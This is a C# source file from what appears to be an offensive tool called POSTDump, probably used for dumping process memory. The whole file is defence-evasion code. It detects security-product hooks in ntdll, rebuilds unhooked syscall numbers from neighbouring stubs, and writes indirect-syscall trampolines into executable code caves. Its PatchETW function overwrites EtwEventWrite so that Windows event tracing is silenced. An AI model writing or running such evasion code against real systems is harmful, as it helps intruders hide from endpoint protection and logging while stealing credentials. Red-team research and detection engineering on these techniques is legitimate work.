using System;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Linq;
using Data = POSTMiniDump.Data;

namespace POSTDump
{
    public class ISyscall
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Data.NTSTATUS NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, UInt32 bytesToRead, ref uint bytesRead);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength, out UInt32 BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Data.NTSTATUS NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref IntPtr regionSize, uint newProtect, out uint oldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtQueryVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, Data.MEMORY_INFORMATION_CLASS MemoryInformationClass, ref Data.MEMORY_BASIC_INFORMATION MemoryInformation, ulong MemoryInformationLength, ref uint ReturnLength);

        SortedDictionary<long, string> NtTable;
        IntPtr modptr;
        public IntPtr ntprotptr;
        public IntPtr ntreadptr;
        public IntPtr ntwriteptr;
        public IntPtr ntqueryptr;
        public IntPtr ntcloseptr;
        public IntPtr ntopenptr;
        public IntPtr ntquerysys;
        static byte[] unhooked = new byte[] { };
        long lastcodecave;

        public ISyscall()
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.ModuleName.ToLower() == "ntdll.dll")
                {
                    modptr = Mod.BaseAddress;
                    break;
                }
            }
            NtTable = buildNtTable();

            unhooked = GetFuncBytes((IntPtr)(-1), GetExportAddress("NtCancelTimer")); // Taking NtCancelTimer as reference for unhooked stub (avoid hardcoded static bytes)
            ntprotptr = GetSyscallPtr("NtProtectVirtualMemory");
            ntreadptr = GetSyscallPtr("NtReadVirtualMemory");
            ntwriteptr = GetSyscallPtr("NtWriteVirtualMemory");
            ntqueryptr = GetSyscallPtr("NtQueryVirtualMemory");
            ntcloseptr = GetSyscallPtr("NtClose");
            ntopenptr = GetSyscallPtr("NtOpenProcess");
            ntquerysys = GetSyscallPtr("NtQuerySystemInformation");

        }

        private SortedDictionary<long, string> buildNtTable()
        {
            IntPtr funcptr = IntPtr.Zero;
            var dosHeader = Marshal.PtrToStructure<PE.IMAGE_DOS_HEADER>(modptr);
            var peHeader = Marshal.PtrToStructure<PE.IMAGE_OPTIONAL_HEADER64>(new IntPtr(modptr.ToInt64() + dosHeader.e_lfanew + 4 + Marshal.SizeOf<PE.IMAGE_FILE_HEADER>()));
            var exportHeader = Marshal.PtrToStructure<PE.IMAGE_EXPORT_DIRECTORY>(modptr + (int)peHeader.ExportTable.VirtualAddress);
            NtTable = new SortedDictionary<long, string> { };

            for (int i = 0; i < exportHeader.NumberOfNames; i++)
            {
                var nameAddr = Marshal.ReadInt32(modptr + (int)exportHeader.AddressOfNames + (i * 4));
                var m = Marshal.PtrToStringAnsi(modptr + (int)nameAddr);
                if ( m.StartsWith("Nt") && !m.Contains("Ntdll") )
                {

                    var exportAddr = Marshal.ReadInt32(modptr + (int)exportHeader.AddressOfFunctions + ((i + 1) * 4));
                    funcptr = modptr + (int)exportAddr;
                    NtTable.Add(funcptr.ToInt64(), m);
                }
            }
            //Console.WriteLine(string.Join("\n", NtTable.Values));
            return NtTable;
        }

        public static IntPtr GetExportAddress(string name)
        {
            IntPtr modptr = IntPtr.Zero;
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.ModuleName.ToLower() == "ntdll.dll")
                {
                    modptr = Mod.BaseAddress;
                    break;
                }
            }

            IntPtr funcptr = IntPtr.Zero;
            var dosHeader = Marshal.PtrToStructure<PE.IMAGE_DOS_HEADER>(modptr);
            var peHeader = Marshal.PtrToStructure<PE.IMAGE_OPTIONAL_HEADER64>(new IntPtr(modptr.ToInt64() + dosHeader.e_lfanew + 4 + Marshal.SizeOf<PE.IMAGE_FILE_HEADER>()));
            var exportHeader = Marshal.PtrToStructure<PE.IMAGE_EXPORT_DIRECTORY>(modptr + (int)peHeader.ExportTable.VirtualAddress);

            for (int i = 0; i < exportHeader.NumberOfNames; i++)
            {
                var nameAddr = Marshal.ReadInt32(modptr + (int)exportHeader.AddressOfNames + (i * 4));
                var m = Marshal.PtrToStringAnsi(modptr + (int)nameAddr);
                if (m.ToLower().Equals(name.ToLower()))
                {
                    var exportAddr = Marshal.ReadInt32(modptr + (int)exportHeader.AddressOfFunctions + ((i + 1) * 4));
                    funcptr = modptr + (int)exportAddr;
                    break;
                }
            }
            return funcptr;
        }

        //Build syscall and return pointer
        public IntPtr GetSyscallPtr(string func)
        {
            //Console.WriteLine(func + "hooked, using syscall.");
            byte[] bytes = GetSyscallFromNeighbour(func);
            byte[] stack = bytes.Take(8).ToArray();

            IntPtr addr = GetExportAddress(func) + 0x12;
            IntPtr stub = findcodecave((uint)bytes.Length);
            byte[] isyscall = GetJmp(stack, (ulong)addr);

            unsafe
            {
                byte* ptr = (byte*)stub;
                for (uint i = 0; i < (uint)isyscall.Length; i++)
                {
                    *(ptr + i) = isyscall[i];
                }
            }

                
            return stub;
        }

        public static byte[] GetJmp(byte[] stack, ulong addr)
        {
            byte[] jmp = new byte[2] { 0x49, 0xBB };
            byte[] jmp2 = new byte[3] { 0x41, 0xFF, 0xE3 };
            byte[] shortjmp = BitConverter.GetBytes(addr);
            byte[] isyscall = stack.Concat(jmp).Concat(shortjmp).Concat(jmp2).ToArray();
            return isyscall;

        }

        private byte[] GetFuncBytes(IntPtr handle, IntPtr funcptr, bool display = false)
        {
            List<byte> b = new List<byte>();
            byte[] currentbyte = new byte[1];
            int i = 0;
            bool w = false;
            uint byteread = 0;
            NtReadVirtualMemory NTRVM  ;
            
            if (ntreadptr == IntPtr.Zero)
            {
                NTRVM = (NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(GetExportAddress("NtReadVirtualMemory"), typeof(NtReadVirtualMemory));
            } 
            else
            {
                NTRVM = (NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntreadptr, typeof(NtReadVirtualMemory));
            }
            
            while (!w)
            {
                NTRVM(handle, funcptr, currentbyte, 1, ref byteread);
                b.Add(currentbyte[0]);

                if (b.Count > 4 && (b[i] == 0xC3 & b[i - 1] == 0x05 & b[i - 2] == 0x0F))
                {
                    w = true;
                }

                ++i;
                funcptr = new IntPtr(funcptr.ToInt64() + 1);
            }

            int bsize = b.Count;
            byte[] bytes = new byte[bsize];
            for (int a = 0; a < bsize; a++)
            {
                bytes[a] = b[a];
            }

            if (display)
                Console.WriteLine(BitConverter.ToString(bytes));

            return bytes;
        }

        //GetSyscall from neighbour, assuming NtCancelTimer is not hooked
        private byte[] GetSyscallFromNeighbour(string funcname)
        {
            byte[] stub = unhooked;
            int index = NtTable.Select(kvp => kvp.Value).ToList().IndexOf(funcname);
            int counter = 0;

            try
            {
                for (int i = index; i != 0; i--)
                {
                    if (!isHooked(new IntPtr(-1), NtTable.ElementAt(i).Value))
                    {
                        byte[] b = GetFuncBytes(new IntPtr(-1), (IntPtr)NtTable.ElementAt(i).Key);
                        byte[] tempByteArray = new byte[2] { b[4], b[5] };
                        int num = BitConverter.ToUInt16(tempByteArray, 0);
                        byte[] syscall = BitConverter.GetBytes((num + counter));
                        syscall.CopyTo(stub, 4);
                        break;
                    }
                    counter++;

                }
            }
            catch (ArgumentOutOfRangeException)
            {
                counter = 0;
                for (int a = index; a < NtTable.Count(); a++)
                {
                    if (!isHooked(new IntPtr(-1), NtTable.ElementAt(a).Value))
                    {
                        byte[] b = GetFuncBytes(new IntPtr(-1), (IntPtr)NtTable.ElementAt(a).Key);
                        byte[] tempByteArray = new byte[2] { b[4], b[5] };
                        int num = BitConverter.ToUInt16(tempByteArray, 0);
                        byte[] syscall = BitConverter.GetBytes((num - counter));
                        syscall.CopyTo(stub, 4);
                        break;
                    }
                    counter++;
                }
            }

            return stub;
        }

        private bool isHooked(IntPtr handle, string funcname)
        {
            byte[] hooked = GetFuncBytes(handle, GetExportAddress(funcname));
            int inc = 0;
            // check if the 8 first bytes are identical or not (syscall excluded)
            for (int i = 0; i <= 8; i++)
            {
                //Skip syscall number except if its a jump
                if (i == 4 && hooked[i] != 0xE9)
                {
                    continue;
                }

                if (hooked[i] != unhooked[i])
                {
                    inc++;
                }
            }
            // if more than 2 bytes are different -> hooked
            if (inc > 2)
            {
                return true;
            }

            return false;
        }


        //https://github.com/SECFORCE/SharpWhispers/blob/main/out/sharpASM.cs
        private static bool isPtrAligned(IntPtr ptr)
        {

            // We want to be aligned to
            // - 8 bytes (64 bit) bit for x86 [32 bit]
            // - 16 bytes (128 bit) for x86-64 [64 bit]

            var ptr_int = ptr.ToInt64();

			if (ptr_int % 16 == 0) return true;

            else return false;
        }

        //https://github.com/SECFORCE/SharpWhispers/blob/main/out/sharpASM.cs
        private static IntPtr AlignPtr(IntPtr ptr)
        {
            var ptr_int = ptr.ToInt64();
			Int64 offset = 0;
			offset = ptr_int % 16;
            IntPtr alignedPtr = new IntPtr(ptr_int - offset);

            // scan sequence
            unsafe
            {
                byte* array = (byte*)alignedPtr;
                for (int i = 1; ; ++i)
                {
                    if (i == offset)
                    { // full sequence matched?
                        return (IntPtr)(array);
                    }
                    else if (array[i] != 0)
                    {
                        break;
                    }
                }
            }

            // We didn't find the 0 sequence, we have to search another area
            return new IntPtr(-1);
        }

        //https://github.com/SECFORCE/SharpWhispers/blob/main/out/sharpASM.cs
        private static IntPtr GetZeroSequence(IntPtr addr, IntPtr regionLength, uint patternLength)
        {
            //Console.WriteLine("[i] Searching sequence of " + patternLength + " NULL bytes to host the stub...");

            // We will start searching from the end
            Int64 end = (Int64)regionLength - 1; // past here no match is possible
            uint start = 0;
            int offset = 1;
            unsafe
            {
                byte* array = (byte*)addr;

                while (start <= end)
                {
                    // scan for first byte only. compiler-friendly.
                    if (array[end] == 0)
                    {
                        // scan for rest of sequence
                        for (offset = 1; ; ++offset)
                        {
                            if (offset == patternLength)
                            { // full sequence matched?

                                // Verify aligment
                                IntPtr retPtr = (IntPtr)(array + end - offset);
                                if (!isPtrAligned(retPtr))
                                {
                                    retPtr = AlignPtr(retPtr);
                                    // if -1 is returned, it means that we didn't find enough 0s to be aligned
                                    // We have to continue to search
                                    if (retPtr.Equals(-1)) break;
                                }

                                // The start address is aligned
                                return retPtr;


                            }
                            else if (array[end - offset] != 0)
                            {
                                break;
                            }
                        }
                    }

                    // If we arrive here, either
                    // we found a value != 0 at array[end - offset]
                    // or the pointer was not aligned
                    end = end - offset;
                }

            }

            return IntPtr.Zero;
        }

        //https://github.com/SECFORCE/SharpWhispers/blob/main/out/sharpASM.cs
        private IntPtr findcodecave(uint len)
        {
            IntPtr caveAddr = IntPtr.Zero;
            IntPtr proc_min_address = new IntPtr(0x1000);
            IntPtr proc_max_address = new IntPtr(0x7FFFFFFEFFFF);
            IntPtr processHandle = (IntPtr)(-1);
            Data.MEMORY_BASIC_INFORMATION mem_basic_info = new Data.MEMORY_BASIC_INFORMATION();
            Data.MEMORY_INFORMATION_CLASS mic = new Data.MEMORY_INFORMATION_CLASS();
            var proc_min_address_l = proc_min_address.ToInt64();
            var proc_max_address_l = proc_max_address.ToInt64();
            uint returnL = 0;
            NtQueryVirtualMemory NTQVM;

            if (ntqueryptr == IntPtr.Zero)
            {
                NTQVM = (NtQueryVirtualMemory)Marshal.GetDelegateForFunctionPointer(GetExportAddress("NtQueryVirtualMemory"), typeof(NtQueryVirtualMemory));
            }
            else
            {
                NTQVM = (NtQueryVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntqueryptr, typeof(NtQueryVirtualMemory));
            }
            
            while (proc_min_address_l < proc_max_address_l)
            {
                Data.NTSTATUS rez = NTQVM((IntPtr)(-1), proc_min_address, mic, ref mem_basic_info, (ulong)Convert.ToInt64(Marshal.SizeOf(mem_basic_info)), ref returnL);
                if (rez != Data.NTSTATUS.Success)
                {
                    proc_min_address_l += (long)mem_basic_info.RegionSize;
                    proc_min_address = new IntPtr(proc_min_address_l);
                    continue;
                }


                // if this memory chunk is accessible and RWX
                if (mem_basic_info.State == Data.StateEnum.MEM_COMMIT && mem_basic_info.Protect == Data.AllocationProtectEnum.PAGE_EXECUTE_READWRITE)
                {
                    //Console.WriteLine("[i] Found RWX Region: " + proc_min_address.ToString("X"));
                    if (returnL >= len)
                    {
                        //if (codecave.Contains((long)proc_min_address))
                        if (lastcodecave == (long)proc_min_address)
                        {
                            //Console.WriteLine("Memory area used for the previous code cave.. Skipping");
                            proc_min_address_l += (long)mem_basic_info.RegionSize;
                            proc_min_address = new IntPtr(proc_min_address_l);
                            continue;

                        }
                        else
                        {
                            //codecave.Add((long)proc_min_address);
                            lastcodecave = (long)proc_min_address;
                            // Search for enough 0s starting from the end of the page
                            // This will decrease the likelihood that the region hosting our stub will be overridden before we execute it
                            caveAddr = GetZeroSequence(proc_min_address, (IntPtr)mem_basic_info.RegionSize, len);

                            IntPtr failed = new IntPtr(-1);
                            if (caveAddr != IntPtr.Zero && caveAddr != failed)
                            {
                                //Console.WriteLine("[>] Sequence of 0s Found : " + string.Format("{0:X}", caveAddr.ToInt64()));
                                return caveAddr;
                            }
                        }
                    }
                }

                // move to the next memory chunk
                proc_min_address_l += (long)mem_basic_info.RegionSize;
                proc_min_address = new IntPtr(proc_min_address_l);
            }

            // If no codecave found:
            //Console.WriteLine("Not Found!");

            return IntPtr.Zero;
        }

        public void PatchETW()
        {
            //var patch = new byte[] { 0xc3 }; //ret
            //IntPtr funcptr = GetExportAddress("NtTraceEvent"); 
            var patch = new byte[] { 0x48, 0x31, 0xc0, 0xc3 }; //xor rax,rax; ret
            IntPtr funcptr = GetExportAddress("EtwEventWrite");
            IntPtr oldaddress = funcptr;
            IntPtr RegionSize = (IntPtr)patch.Length;
            NtProtectVirtualMemory NTPVM = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntprotptr, typeof(NtProtectVirtualMemory));
            //NTPVM(new IntPtr(-1), ref funcptr, ref RegionSize, 0x40, out uint old);
            NTPVM((IntPtr)(-1), ref funcptr, ref RegionSize, 0x04, out uint old);
            Marshal.Copy(patch, 0, oldaddress, patch.Length);
            ////Console.WriteLine("ETW patched.\n");

            NTPVM((IntPtr)(-1), ref funcptr, ref RegionSize, old, out uint _);
            return;
        }
    }
}
